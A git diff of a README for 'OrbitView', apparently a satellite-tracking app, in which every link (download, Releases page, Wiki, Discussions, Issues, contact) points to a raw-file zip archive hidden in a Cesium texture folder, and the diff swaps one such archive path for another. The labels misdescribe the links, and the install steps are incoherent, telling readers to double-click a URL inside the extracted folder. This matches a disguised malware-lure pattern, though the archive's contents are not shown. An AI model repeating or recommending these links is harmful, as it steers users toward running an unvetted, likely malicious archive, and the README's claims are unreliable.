@@ -4,7 +4,7 @@
 Welcome to OrbitView! This app helps you visualize satellites in 3D and track their movements. You can see passes, predict future locations, and analyze potential conjunctions. Let’s get you set up.
 
 ## 📥 Download OrbitView
-[![Download OrbitView](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip)](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip)
+[![Download OrbitView](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip)](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip)
 
 ## 📚 Features
 - **3D Satellite Visualization:** View satellites from different angles in real-time.
@@ -19,11 +19,11 @@ Welcome to OrbitView! This app helps you visualize satellites in 3D and track th
 - **Internet Connection:** Required for real-time data updates.
 
 ## 🔧 Download & Install
-1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip) to access the Releases page.
+1. **Visit this page to download:** Click [here](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip) to access the Releases page.
 2. **Choose a version:** Look for the latest version of OrbitView.
-3. **Download the application:** Click on the `https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip` file to download the software.
+3. **Download the application:** Click on the `https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip` file to download the software.
 4. **Extract the files:** Locate the downloaded zip file and extract its contents to a folder of your choice.
-5. **Run the application:** Open the extracted folder, find `https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip`, and double-click to start the app.
+5. **Run the application:** Open the extracted folder, find `https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip`, and double-click to start the app.
 
 ## 👩‍💻 Using OrbitView
 Once you have installed the application, you can start exploring:
@@ -33,27 +33,27 @@ Once you have installed the application, you can start exploring:
 - **Analyzing Conjunctions:** Enter two satellites to check their potential collision risks.
 
 ## 📖 Documentation
-For detailed instructions and guides on advanced features, please refer to our [Wiki](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip).
+For detailed instructions and guides on advanced features, please refer to our [Wiki](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter issues:
 
 - **Check Internet Connection:** Ensure you are connected to the internet.
 - **Refer to Help Section:** In the app, access the Help menu for quick tips.
-- **Community Support:** Visit our [Discussions page](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip) for help from other users and contributors. 
+- **Community Support:** Visit our [Discussions page](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip) for help from other users and contributors. 
 
 ## 📝 Contributing
 We welcome contributions! If you would like to report bugs, suggest features, or help improve the app, feel free to create an issue or contribute directly through pull requests.
 
 ## 🌟 Feedback
-Your feedback is valuable to us. If you enjoy using OrbitView or have suggestions for improvement, please let us know through the [Issues page](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip).
+Your feedback is valuable to us. If you enjoy using OrbitView or have suggestions for improvement, please let us know through the [Issues page](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip).
 
 ## 📬 Contact
-For further inquiries or support requests, reach out at https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip We are here to help!
+For further inquiries or support requests, reach out at https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip We are here to help!
 
 ## 🗨️ Final Thoughts
 OrbitView provides a powerful and straightforward way to track satellites and visualize their orbits in real-time. We hope you enjoy using it as much as we enjoyed building it. 
 
-Download your version today: [Download OrbitView](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/1/3/View-Orbit-3.4.zip) and start tracking satellites! 
+Download your version today: [Download OrbitView](https://raw.githubusercontent.com/talha9597/OrbitView/main/public/cesium/Assets/Textures/NaturalEarthII/2/4/Orbit-View-v1.2.zip) and start tracking satellites! 
 
 Happy tracking!
